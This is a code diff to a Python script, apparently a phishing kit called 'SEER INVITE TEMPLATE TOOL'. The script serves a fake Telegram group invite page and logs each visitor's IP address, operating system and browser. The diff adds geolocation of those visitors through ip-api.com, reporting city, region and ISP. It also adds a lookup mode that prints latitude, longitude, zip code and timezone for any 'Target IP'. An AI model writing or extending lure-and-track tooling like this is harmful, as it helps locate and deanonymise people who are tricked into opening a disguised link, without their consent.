@@ -6,8 +6,23 @@ import threading
 import time
 import sys
 import urllib.parse
+import urllib.request
+import json
 import socket
 import os
+
+def lookup_ip(ip):
+    # Skip lookup for local and loopback addresses
+    if ip in ("127.0.0.1", "localhost") or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16.") or ip.startswith("172.31.") or ip.startswith("172.20.") or ip.startswith("172.21.") or ip.startswith("172.22.") or ip.startswith("172.23.") or ip.startswith("172.24.") or ip.startswith("172.25.") or ip.startswith("172.26.") or ip.startswith("172.27.") or ip.startswith("172.28.") or ip.startswith("172.29.") or ip.startswith("172.30."):
+        return {"status": "fail", "message": "Private/Local IP"}
+    try:
+        url = f"http://ip-api.com/json/{ip}"
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            data = json.loads(response.read().decode())
+            return data
+    except Exception as e:
+        return {"status": "fail", "message": str(e)}
 
 def get_local_ip():
     try:
@@ -48,6 +63,9 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
+# Global trace flag
+trace_enabled = False
+
 BANNER = f"""{RED}{BOLD}
       .---.
      /     \\
@@ -65,6 +83,19 @@ BANNER = f"""{RED}{BOLD}
      | || |
 {RESET}{CYAN}      [ SEER INVITE TEMPLATE TOOL ]{RESET}
 """
+
+# Track running HTTP servers to stop/close them when returning to the home screen
+active_servers = []
+
+def stop_active_servers():
+    global active_servers
+    for httpd in list(active_servers):
+        try:
+            httpd.shutdown()
+            httpd.server_close()
+        except Exception:
+            pass
+    active_servers.clear()
 
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     """Custom request handler that silences standard terminal logs for a clean console,
@@ -118,9 +149,30 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             else:
                 browser = 'Unknown'
 
-            print(f"\n{GREEN}[+] Public IP: {YELLOW}{client_ip}{RESET}")
-            print(f"{GREEN}[+] OS: {YELLOW}{os_info}{RESET}")
-            print(f"{GREEN}[+] Browser: {YELLOW}{browser}{RESET}")
+            if trace_enabled:
+                print(f"\n{GREEN}[+] Public IP: {YELLOW}{client_ip}{RESET}")
+                
+                # Perform IP Geolocation Lookup
+                geo = lookup_ip(client_ip)
+                if geo and geo.get("status") == "success":
+                    country = geo.get("country", "Unknown")
+                    country_code = geo.get("countryCode", "")
+                    region = geo.get("regionName", "Unknown")
+                    city = geo.get("city", "Unknown")
+                    isp = geo.get("isp", "Unknown")
+                    
+                    country_str = f"{country} ({country_code})" if country_code else country
+                    print(f"{GREEN}[+] Location:  {YELLOW}{city}, {region}, {country_str}{RESET}")
+                    print(f"{GREEN}[+] ISP:       {YELLOW}{isp}{RESET}")
+                else:
+                    msg = geo.get("message", "Lookup failed / Private IP") if geo else "Lookup failed"
+                    print(f"{RED}[!] IP Lookup:  {YELLOW}{msg}{RESET}")
+                    
+                print(f"{GREEN}[+] OS:        {YELLOW}{os_info}{RESET}")
+                print(f"{GREEN}[+] Browser:   {YELLOW}{browser}{RESET}")
+            else:
+                # Default mode: print a clean, single-line notification
+                print(f"\n{GREEN}[+] Visitor connected from IP: {YELLOW}{client_ip}{RESET} ({os_info}, {browser})")
             self.send_response(200)
             self.send_header('Content-Type', 'text/plain')
             self.end_headers()
@@ -158,6 +210,7 @@ def run_server(port, target_url):
     
     try:
         with SilentThreadingTCPServer(("", port), handler) as httpd:
+            active_servers.append(httpd)
             # Auto-open browser in a separate thread after 0.5s
             def open_browser():
                 time.sleep(0.5)
@@ -167,7 +220,11 @@ def run_server(port, target_url):
             browser_thread.daemon = True
             browser_thread.start()
             
-            httpd.serve_forever()
+            try:
+                httpd.serve_forever()
+            finally:
+                if httpd in active_servers:
+                    active_servers.remove(httpd)
     except OSError:
         # Port already in use, fail gracefully in background
         pass
@@ -187,12 +244,71 @@ def main():
     script_dir = os.path.dirname(os.path.abspath(__file__))
     os.chdir(script_dir)
     
-    print(BANNER)
-    
-    print(f"{YELLOW}[!] Select a Template :{RESET}\n")
+    while True:
+        print(BANNER)
+
+        # Trace option prompt
+        print(f"{YELLOW}[!] Trace Mode :{RESET}\n")
+        print(f"{GREEN}[1]{RESET} Enable Trace")
+        print(f"{GREEN}[2]{RESET} seeker mode")
+        print(f"{GREEN}[3]{RESET} Exit Program")
+
+        while True:
+            try:
+                trace_input = input(f"{GREEN}[>]{RESET} ")
+                cleaned_trace = trace_input.strip()
+                if cleaned_trace == "" or cleaned_trace == "2":
+                    trace = False
+                    break
+                elif cleaned_trace == "1":
+                    trace = True
+                    break
+                elif cleaned_trace == "3":
+                    print(f"\n{RED}[🛑] Exiting... Goodbye!{RESET}")
+                    sys.exit(0)
+                else:
+                    print(f"{RED}[!] Invalid choice. Select [1], [2], or [3].{RESET}")
+            except (KeyboardInterrupt, EOFError):
+                print(f"\n{RED}[!] Exiting...{RESET}")
+                sys.exit(0)
+
+        if trace:
+            print(f"\n{YELLOW}[!] Trace Mode Enabled - IP Geolocation Lookup{RESET}")
+            while True:
+                target_ip = get_input("Enter Target IP Address : ")
+                if not target_ip:
+                    break
+                    
+                print(f"\n{GREEN}[*] Performing lookup for: {YELLOW}{target_ip}{RESET}")
+                geo = lookup_ip(target_ip)
+                if geo and geo.get("status") == "success":
+                    country = geo.get("country", "Unknown")
+                    country_code = geo.get("countryCode", "")
+                    region = geo.get("regionName", "Unknown")
+                    city = geo.get("city", "Unknown")
+                    zip_code = geo.get("zip", "Unknown")
+                    isp = geo.get("isp", "Unknown")
+                    lat = geo.get("lat", "Unknown")
+                    lon = geo.get("lon", "Unknown")
+                    timezone = geo.get("timezone", "Unknown")
+                    
+                    country_str = f"{country} ({country_code})" if country_code else country
+                    print(f"{GREEN}[+] Location:   {YELLOW}{city}, {region}, {country_str}{RESET}")
+                    print(f"{GREEN}[+] Lat/Lon:    {YELLOW}{lat}, {lon}{RESET}")
+                    print(f"{GREEN}[+] ISP:        {YELLOW}{isp}{RESET}")
+                    print(f"{GREEN}[+] Timezone:   {YELLOW}{timezone}{RESET}")
+                    print(f"{GREEN}[+] Zip Code:   {YELLOW}{zip_code}{RESET}\n")
+                else:
+                    msg = geo.get("message", "Lookup failed") if geo else "Lookup failed"
+                    print(f"{RED}[!] IP Lookup:   {YELLOW}{msg}{RESET}\n")
+            continue
+        
+        # Break outer menu loop to proceed with website generation in seeker mode
+        break
+
+    print(f"\n{YELLOW}[!] Select a Template :{RESET}\n")
     print(f"{GREEN}[1]{RESET} telegram (Default)")
 
-    
     # Selection prompt
     while True:
         try:
@@ -213,16 +329,28 @@ def main():
     
     selected = templates[choice]
     print(f"\n{GREEN}[+]{RESET} Loading {YELLOW}{selected['name']}{RESET} Template...")
+    if trace:
+        print(f"{CYAN}[*]{RESET} Trace mode enabled - visitor activity will be logged.{RESET}")
     
-    # Prompt user for parameters
-    title = get_input(f"Group Title : ", selected["title"])
-    avatar = get_input(f"Image Path / URL (Enter to skip) : ", "")
-    desc = get_input(f"Group Description : ", selected["desc"])
-    members = get_input(f"Number of Members : ", selected["members"])
-    online = get_input(f"Number of Members Online : ", selected["online"])
+    # Use default parameters in Trace Mode; only prompt for customization in Default Mode
+    if trace:
+        title = selected["title"]
+        avatar = ""
+        desc = selected["desc"]
+        members = selected["members"]
+        online = selected["online"]
+    else:
+        title = get_input(f"Group Title : ", selected["title"])
+        avatar = get_input(f"Image Path / URL (Enter to skip) : ", "")
+        desc = get_input(f"Group Description : ", selected["desc"])
+        members = get_input(f"Number of Members : ", selected["members"])
+        online = get_input(f"Number of Members Online : ", selected["online"])
     
     # Choose theme style - Forced to Light
     platform = selected["platform"]
+    # Store trace setting for later use
+    global trace_enabled
+    trace_enabled = trace
             
     port = find_free_port(8080)
         
@@ -256,14 +384,17 @@ def main():
     
     print(f"\n{GREEN}[*] Local Access URL:   {YELLOW}{target_url}{RESET}")
     print(f"{GREEN}[*] Network Access URL: {YELLOW}{lan_url}{RESET}")
-    print(f"{GREEN}[+] Waiting for Client...[ctrl+c to exit]{RESET}")
-    
-    # Hold the server thread active until manual keyboard interrupt
+    # Hold the server thread active until Enter is pressed or manual keyboard interrupt
     try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
+        input(f"\n{GREEN}[+] Waiting for Client... [Press Enter to go to home / Ctrl+C to exit]{RESET}\n")
+        print(f"\n{YELLOW}[!] Stopping server and returning to home...{RESET}")
+        stop_active_servers()
+        time.sleep(0.5)
+        main()
+        sys.exit(0)
+    except (KeyboardInterrupt, EOFError):
         print(f"\n\n{RED}[🛑] Local server stopped. Goodbye!{RESET}")
+        stop_active_servers()
         sys.exit(0)
 
 if __name__ == "__main__":
